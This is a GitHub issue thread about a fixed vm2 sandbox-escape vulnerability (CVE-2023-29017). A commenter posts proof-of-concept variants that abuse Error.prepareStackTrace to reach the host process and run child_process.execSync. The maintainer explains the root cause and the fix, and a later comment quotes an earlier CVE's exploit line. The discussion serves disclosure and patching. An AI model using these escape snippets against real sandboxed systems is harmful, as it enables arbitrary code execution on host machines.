[![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?s=80&u=73ffe75f257b9fb673fc9ee52cdb19ef2a76ebe9&v=4)](/XmiliaH)

Copy link

Collaborator

### **[XmiliaH](/XmiliaH)** commented [Apr 6, 2023](#issuecomment-1499505748)

| Fix in release 3.9.15. (See advisory [GHSA-7jxr-cg7f-gpgv](https://github.com/patriksimek/vm2/security/advisories/GHSA-7jxr-cg7f-gpgv "GHSA-7jxr-cg7f-gpgv")) |
| --- |

All reactions

Sorry, something went wrong.

[![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?s=40&u=73ffe75f257b9fb673fc9ee52cdb19ef2a76ebe9&v=4)](/XmiliaH)
[XmiliaH](/XmiliaH)
closed this as [completed](/patriksimek/vm2/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Apr 6, 2023](#event-8949001823)

[![@sickcodes](https://avatars.githubusercontent.com/u/65906298?s=80&u=7b8ae9f1fb347ca4f74404d0b379b9779fad3419&v=4)](/sickcodes)

Copy link

### **[sickcodes](/sickcodes)** commented [Apr 8, 2023](#issuecomment-1500916638)

| Nice one [@XmiliaH](https://github.com/XmiliaH)!  Any feedback on the root cause?  Tried other arrangements of the PoC  ``` Error.arguments = (e, frames) => {     frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag');  };  ```  ``` Error.caller = (e, frames) => {     frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag');  };  ```  ``` Error.prepareStackTrace = (e, frames) => {     frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag');  };  ```  First two, produce `''caller', 'callee', and 'arguments' properties may not be accessed on strict mode functions or the arguments objects for calls to them'`  Added some print breakpoints, 3.9.14:  ``` ======= transformer.js:182 hasAsync true transformer.js:183 isAsync false transformer.js:184 code  Error.prepareStackTrace = (e, frames) => {     frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag');  }; (async ()=>{}).constructor('return process')()  transformer.js:185 =======  ```  ``` ======= transformer.js:182 hasAsync true transformer.js:183 isAsync true transformer.js:184 code (async function anonymous( ) { return process }) transformer.js:185 =======  ```  Does it have anything to do with `isAsync` and `hasAsync`?  Then set BP on `localArrayIsArray` in setup-sandbox, shows:  `Error.prepareStackTrace` becomes:  ``` (error, sst) => { 				if (localArrayIsArray(sst)) { 					for (let i=0; i < sst.length; i++) { 						const cs = sst[i]; 						if (typeof cs === 'object' && localReflectGetPrototypeOf(cs) === OriginalCallSite.prototype) { 							sst[i] = new CallSite(cs); 						} 					} 				} 				return value(error, sst); 			} ```  Line 63 in the sandbox:  ``` // global is originally prototype of host.Object so it can be used to climb up from the sandbox. if (!localReflectSetPrototypeOf(context, localObject.prototype)) throw localUnexpected(); ```  Is Error, below, missing configuration properties?  ``` Object.defineProperties(global, { 	global: {value: global, writable: true, configurable: true, enumerable: true}, 	globalThis: {value: global, writable: true, configurable: true}, 	GLOBAL: {value: global, writable: true, configurable: true}, 	root: {value: global, writable: true, configurable: true}, 	Error: {value: LocalError} }); ```  ``` 	function thisFromOther(other) { 		// Note: other@other(unsafe) returns@this(unsafe) throws@this(unsafe) 		return thisFromOtherWithFactory(defaultFactory, other); 	}  ```  Or `currentPrepareStackTrace`? |
| --- |

All reactions

Sorry, something went wrong.

[![@sickcodes](https://avatars.githubusercontent.com/u/65906298?s=80&u=7b8ae9f1fb347ca4f74404d0b379b9779fad3419&v=4)](/sickcodes)

Copy link

### **[sickcodes](/sickcodes)** commented [Apr 8, 2023](#issuecomment-1500918283)

| I see [#516](https://github.com/patriksimek/vm2/issues/516)  ``` const EvalHandler = {     __proto__: null,     apply(target, thiz, args) {         if (args.length === 0) return undefined;         let code = `${args[0]}`;         try {             code = host.transformAndCheck(null, code, false, false, allowAsync);         } catch (e) {             throw bridge.from(e);         }         return localEval(code);     } };  ```  Where, `host.transformAndCheck(null, code, false, false, allowAsync);`  So, `isAsync` is false, however, the code is:  ``` async function aa(){     eval("1=1") } aa()  ```  vm.js line 93,  ``` function transformAndCheck(args, code, isAsync, isGenerator, allowAsync) {     const ret = transformer(args, code, isAsync, isGenerator, undefined);     checkAsync(allowAsync || !ret.hasAsync);     return ret.code; }  ```  Produces: `{code: '1=1', hasAsync: false}`  Which is allegedly async? |
| --- |

All reactions

Sorry, something went wrong.

[![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?s=80&u=73ffe75f257b9fb673fc9ee52cdb19ef2a76ebe9&v=4)](/XmiliaH)

Copy link

Collaborator

### **[XmiliaH](/XmiliaH)** commented [Apr 8, 2023](#issuecomment-1500919338)

| Any feedback on the root cause?  The root cause was that `frames` is a host array for newer node versions in case of unhandled async errors. Therefore, the `frames` array is now converted to a sandbox object when it is a host object.  First two, produce `''caller', 'callee', and 'arguments' properties may not be accessed on strict mode functions or the arguments objects for calls to them'`  This is expected.  Does it have anything to do with `isAsync` and `hasAsync`?  It has noting to do with async. It only required an unhandled async exception.  So, `isAsync` is false, however, the code is:  ``` async function aa(){     eval("1=1") } aa() ```  the `eval` is only there to throw a syntax error to trigger an unhandled async error in the `aa` function. |
| --- |

 ❤️
2
 sickcodes and xmpf reacted with heart emoji

All reactions

* ❤️
  2 reactions

Sorry, something went wrong.

[![@urbantom](https://avatars.githubusercontent.com/u/22394408?s=80&v=4)](/urbantom)

Copy link

### **[urbantom](/urbantom)** commented [Apr 8, 2023](#issuecomment-1500975343)

| Does `npm audit` command report this vulnerability? |
| --- |

All reactions

Sorry, something went wrong.

[![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?s=80&u=73ffe75f257b9fb673fc9ee52cdb19ef2a76ebe9&v=4)](/XmiliaH)

Copy link

Collaborator

### **[XmiliaH](/XmiliaH)** commented [Apr 8, 2023](#issuecomment-1500976000)

| [@urbantom](https://github.com/urbantom) Looking at <https://github.blog/2021-10-07-github-advisory-database-now-powers-npm-audit/> it should, though I did not test it. |
| --- |

All reactions

Sorry, something went wrong.

[![@urbantom](https://avatars.githubusercontent.com/u/22394408?s=80&v=4)](/urbantom)

Copy link

### **[urbantom](/urbantom)** commented [Apr 8, 2023](#issuecomment-1500979275)

| Does anyone have a vulnerable environment to test the `npm audit` verification approach? I'll be able to bring my results in the next few days. |
| --- |

All reactions

Sorry, something went wrong.

[![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?s=80&u=73ffe75f257b9fb673fc9ee52cdb19ef2a76ebe9&v=4)](/XmiliaH)

Copy link

Collaborator

### **[XmiliaH](/XmiliaH)** commented [Apr 8, 2023](#issuecomment-1500979827)

| [@urbantom](https://github.com/urbantom) I just checked. You will get:  ``` npm audit # npm audit report  vm2  <3.9.15 Severity: critical vm2 vulnerable to sandbox escape - https://github.com/advisories/GHSA-7jxr-cg7f-gpgv fix available via `npm audit fix` node_modules/vm2  1 critical severity vulnerability  To address all issues, run:   npm audit fix ``` |
| --- |

 👍
2
 urbantom and ygnoh reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@fraxken](https://avatars.githubusercontent.com/u/4438263?s=40&v=4)](/fraxken)
[fraxken](/fraxken)
mentioned this issue
[Apr 9, 2023](#ref-issue-1659736834)

[Adding a Security Policy
#517](/patriksimek/vm2/issues/517)

Open

[otc-zuul](/apps/otc-zuul) bot
pushed a commit
to opentelekomcloud-infra/backstage
that referenced
this issue
[Apr 9, 2023](#ref-commit-09198d5)
[![@dependabot](https://avatars.githubusercontent.com/in/29110?s=40&v=4)](/apps/dependabot)

`[Bump vm2 from 3.9.13 to 3.9.15 (](/opentelekomcloud-infra/backstage/commit/09198d53fbc23a297c39ae466f6f9f8820d107bb "Bump vm2 from 3.9.13 to 3.9.15 (#9)

Bump vm2 from 3.9.13 to 3.9.15

Bumps vm2 from 3.9.13 to 3.9.15.

Release notes
Sourced from vm2's releases.

3.9.15
Fixes
patriksimek/vm2@d534e57: Ensure no host objects are passed through to Error.prepareStackTrace. (Thanky to Seongil Wi from KAIST WSP Lab)
3.9.14
Fixes
patriksimek/vm2@fe3ab68: Support conditional export resolution with custom resolver (thanks to nick-klaviyo).

Changelog
Sourced from vm2's changelog.

v3.9.15 (2023-04-06)
[fix] Security fix (see patriksimek/vm2#515).
v3.9.14 (2023-02-05)
[new] Support conditional export resolution with custom resolver. (nick-klaviyo)

Commits

115d164 Release 3.9.15
d534e57 Wrap host objects passes through prepareStackTrace
e541782 Merge pull request #506 from XmiliaH/release-3.9.14
066afd1 Release 3.9.14
fe3ab68 Merge pull request #505 from NapkinHQ/fix-conditional-export-resolve
eefe3f1 update .eslintignore;update index.d.ts resolve return type
c70d945 add 'type':'module' in es module package.json
4659ce0 add additional return type for resolve signature
1da4415 add missing semicolon
5a86675 Support conditional export resolution with custom resolver
Additional commits viewable in compare view

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting @dependabot rebase.

Dependabot commands and options

You can trigger Dependabot actions by commenting on this PR:

@dependabot rebase will rebase this PR
@dependabot recreate will recreate this PR, overwriting any edits that have been made to it
@dependabot merge will merge this PR after your CI passes on it
@dependabot squash and merge will squash and merge this PR after your CI passes on it
@dependabot cancel merge will cancel a previously requested merge and block automerging
@dependabot reopen will reopen this PR if it is closed
@dependabot close will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
@dependabot ignore this major version will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
@dependabot ignore this minor version will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
@dependabot ignore this dependency will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
You can disable automated security fix PRs for this repo from the Security Alerts page.

Reviewed-by: Artem Goncharov")[#9](https://github.com/opentelekomcloud-infra/backstage/pull/9)[)](/opentelekomcloud-infra/backstage/commit/09198d53fbc23a297c39ae466f6f9f8820d107bb "Bump vm2 from 3.9.13 to 3.9.15 (#9)

Bump vm2 from 3.9.13 to 3.9.15

Bumps vm2 from 3.9.13 to 3.9.15.

Release notes
Sourced from vm2's releases.

3.9.15
Fixes
patriksimek/vm2@d534e57: Ensure no host objects are passed through to Error.prepareStackTrace. (Thanky to Seongil Wi from KAIST WSP Lab)
3.9.14
Fixes
patriksimek/vm2@fe3ab68: Support conditional export resolution with custom resolver (thanks to nick-klaviyo).

Changelog
Sourced from vm2's changelog.

v3.9.15 (2023-04-06)
[fix] Security fix (see patriksimek/vm2#515).
v3.9.14 (2023-02-05)
[new] Support conditional export resolution with custom resolver. (nick-klaviyo)

Commits

115d164 Release 3.9.15
d534e57 Wrap host objects passes through prepareStackTrace
e541782 Merge pull request #506 from XmiliaH/release-3.9.14
066afd1 Release 3.9.14
fe3ab68 Merge pull request #505 from NapkinHQ/fix-conditional-export-resolve
eefe3f1 update .eslintignore;update index.d.ts resolve return type
c70d945 add 'type':'module' in es module package.json
4659ce0 add additional return type for resolve signature
1da4415 add missing semicolon
5a86675 Support conditional export resolution with custom resolver
Additional commits viewable in compare view

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting @dependabot rebase.

Dependabot commands and options

You can trigger Dependabot actions by commenting on this PR:

@dependabot rebase will rebase this PR
@dependabot recreate will recreate this PR, overwriting any edits that have been made to it
@dependabot merge will merge this PR after your CI passes on it
@dependabot squash and merge will squash and merge this PR after your CI passes on it
@dependabot cancel merge will cancel a previously requested merge and block automerging
@dependabot reopen will reopen this PR if it is closed
@dependabot close will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
@dependabot ignore this major version will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
@dependabot ignore this minor version will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
@dependabot ignore this dependency will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
You can disable automated security fix PRs for this repo from the Security Alerts page.

Reviewed-by: Artem Goncharov")`
…

`[09198d5](/opentelekomcloud-infra/backstage/commit/09198d53fbc23a297c39ae466f6f9f8820d107bb)`

```
Bump vm2 from 3.9.13 to 3.9.15

Bumps vm2 from 3.9.13 to 3.9.15.

Release notes
Sourced from vm2's releases.

3.9.15
Fixes
[patriksimek/vm2@d534e57](https://github.com/patriksimek/vm2/commit/d534e57): Ensure no host objects are passed through to Error.prepareStackTrace. (Thanky to Seongil Wi from KAIST WSP Lab)
3.9.14
Fixes
[patriksimek/vm2@fe3ab68](https://github.com/patriksimek/vm2/commit/fe3ab68): Support conditional export resolution with custom resolver (thanks to nick-klaviyo).

Changelog
Sourced from vm2's changelog.

v3.9.15 (2023-04-06)
[fix] Security fix (see [patriksimek/vm2#515](https://github.com/patriksimek/vm2/issues/515)).
v3.9.14 (2023-02-05)
[new] Support conditional export resolution with custom resolver. (nick-klaviyo)

Commits

115d164 Release 3.9.15
d534e57 Wrap host objects passes through prepareStackTrace
e541782 Merge pull request #506 from XmiliaH/release-3.9.14
066afd1 Release 3.9.14
fe3ab68 Merge pull request #505 from NapkinHQ/fix-conditional-export-resolve
eefe3f1 update .eslintignore;update index.d.ts resolve return type
c70d945 add 'type':'module' in es module package.json
4659ce0 add additional return type for resolve signature
1da4415 add missing semicolon
5a86675 Support conditional export resolution with custom resolver
Additional commits viewable in compare view

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting [@dependabot](https://github.com/dependabot) rebase.

Dependabot commands and options

You can trigger Dependabot actions by commenting on this PR:

[@dependabot](https://github.com/dependabot) rebase will rebase this PR
[@dependabot](https://github.com/dependabot) recreate will recreate this PR, overwriting any edits that have been made to it
[@dependabot](https://github.com/dependabot) merge will merge this PR after your CI passes on it
[@dependabot](https://github.com/dependabot) squash and merge will squash and merge this PR after your CI passes on it
[@dependabot](https://github.com/dependabot) cancel merge will cancel a previously requested merge and block automerging
[@dependabot](https://github.com/dependabot) reopen will reopen this PR if it is closed
[@dependabot](https://github.com/dependabot) close will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
[@dependabot](https://github.com/dependabot) ignore this major version will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
[@dependabot](https://github.com/dependabot) ignore this minor version will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
[@dependabot](https://github.com/dependabot) ignore this dependency will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
You can disable automated security fix PRs for this repo from the Security Alerts page.

Reviewed-by: Artem Goncharov
```

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
mentioned this issue
[Apr 10, 2023](#ref-issue-1660852776)

[Critical severity - Sandbox Escape vulnerability in vm2 (package.json)
jordaniac89/juice-shop#146](/jordaniac89/juice-shop/issues/146)

Open

[![@cccs-kevin](https://avatars.githubusercontent.com/u/59843993?s=40&v=4)](/cccs-kevin)
[cccs-kevin](/cccs-kevin)
mentioned this issue
[Apr 11, 2023](#ref-pullrequest-1662489515)

[Updating the Box.js tool version to include patch for CVE-2023-29017
CybercentreCanada/assemblyline-service-jsjaws#398](/CybercentreCanada/assemblyline-service-jsjaws/pull/398)
 Merged

[![@TheKingTermux](https://avatars.githubusercontent.com/u/50316075?s=40&v=4)](/TheKingTermux)
[TheKingTermux](/TheKingTermux)
mentioned this issue
[Apr 11, 2023](#ref-issue-1662746217)

[vm2 vulnerable to sandbox escape
TheKingTermux/alice#312](/TheKingTermux/alice/issues/312)

Closed

4 tasks

[![@daysv](https://avatars.githubusercontent.com/u/7411098?s=40&v=4)](/daysv)
[daysv](/daysv)
mentioned this issue
[Apr 12, 2023](#ref-issue-1663904082)

[vm2版本存在安全问题， 建议升级至3.9.16
YMFE/yapi#2682](/YMFE/yapi/issues/2682)

Open

[![@rickyrattlesnake](https://avatars.githubusercontent.com/u/4549582?s=40&v=4)](/rickyrattlesnake)
[rickyrattlesnake](/rickyrattlesnake)
mentioned this issue
[Apr 19, 2023](#ref-issue-1674098320)

[Vulnerability in pm2@5.3.0 CVE-2023-29017
Unitech/pm2#5589](/Unitech/pm2/issues/5589)

Open

[![@helix-bot](https://avatars.githubusercontent.com/u/117035117?s=40&v=4)](/helix-bot)
[helix-bot](/helix-bot)
mentioned this issue
[May 2, 2023](#ref-issue-1693130503)

[vm2 vulnerable to sandbox escape - CVE-2023-29017
apache/helix#2474](/apache/helix/issues/2474)

Closed

[![@blindhacker99](https://avatars.githubusercontent.com/u/75206424?s=80&u=422d0c3454da7979c535d2f8b49a802b5d711779&v=4)](/blindhacker99)

Copy link

### **[blindhacker99](/blindhacker99)** commented [May 10, 2023](#issuecomment-1542420743)

| Hi [@XmiliaH](https://github.com/XmiliaH), I am just curious about how the fix had been done for the pretty same exploit method reported by Oxeye team here - <https://www.oxeye.io/resources/vm2-sandbreak-vulnerability-cve-2022-36067> ??  In oxeye team's report also the method for escaping the sandbox was typically same where attacker is using the prepareStackTrace() method to customise the CallStack() with escaping context scenario . I am mentioning the part of exploit here:  `globalThis.Error.prepareStackTrace = function(err, traces) { traces[0].getThis().process.mainModule.require('child\_process')  // Here the author is exploiting the fact that CallSite array of stack frames is not sandboxed. Though the author is using one of the method here is getThis(). }`  As you have explained above that time itself we could have fix the in the same way right? |
| --- |

All reactions

Sorry, something went wrong.

[![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?s=80&u=73ffe75f257b9fb673fc9ee52cdb19ef2a76ebe9&v=4)](/XmiliaH)

Copy link

Collaborator

### **[XmiliaH](/XmiliaH)** commented [May 10, 2023](#issuecomment-1542538837)

| [CVE-2022-36067](https://github.com/advisories/GHSA-mrgp-mrhc-5jrq "CVE-2022-36067") was different. It used the fact that node does not call the `prepareStackTrace` on the `Error` object but on the object reachable by `globalThis.Error`. In the normal case these two objects are the same but in the mentiond case they changed the `Error` object and got around the wrapping of the `prepareStackTrace` function done on the `Error` object. This exploit used the fact that in some cases the array passed to the `prepareStackTrace` is a host object which was not expected and therefore passed as is into the sandbox. |
| --- |

 ❤️
1
 blindhacker99 reacted with heart emoji

All reactions

* ❤️
  1 reaction

Sorry, something went wrong.

[![@westonphillips](https://avatars.githubusercontent.com/u/31938090?s=40&v=4)](/westonphillips)
[westonphillips](/westonphillips)
mentioned this issue
[Jun 29, 2023](#ref-issue-1781431053)

[CVE-2023-29017 @ Npm-vm2-3.9.11
westonphillips/CheckmarxOnePOV#127](/westonphillips/CheckmarxOnePOV/issues/127)

Open

[![@lsacco-nutreense](https://avatars.githubusercontent.com/u/81121962?s=40&v=4)](/lsacco-nutreense)
[lsacco-nutreense](/lsacco-nutreense)
mentioned this issue
[Oct 20, 2023](#ref-issue-1954350280)

[vm2 transitive dependency security vulnerability
nest-modules/mailer#1070](/nest-modules/mailer/issues/1070)

Closed

[Sign up for free](/join?source=comment-repo)
**to subscribe to this conversation on GitHub**.
Already have an account?
[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpatriksimek%2Fvm2%2Fissues%2F515).

Assignees

No one assigned

Labels

[bug](/patriksimek/vm2/labels/bug)
[confirmed](/patriksimek/vm2/labels/confirmed)

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

6 participants

[![@patriksimek](https://avatars.githubusercontent.com/u/1000058?s=52&v=4)](/patriksimek) [![@urbantom](https://avatars.githubusercontent.com/u/22394408?s=52&v=4)](/urbantom) [![@seongil-wi](https://avatars.githubusercontent.com/u/26154873?s=52&v=4)](/seongil-wi) [![@XmiliaH](https://avatars.githubusercontent.com/u/45106915?s=52&v=4)](/XmiliaH) [![@sickcodes](https://avatars.githubusercontent.com/u/65906298?s=52&v=4)](/sickcodes) [![@blindhacker99](https://avatars.githubusercontent.com/u/75206424?s=52&v=4)](/blindhacker99)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


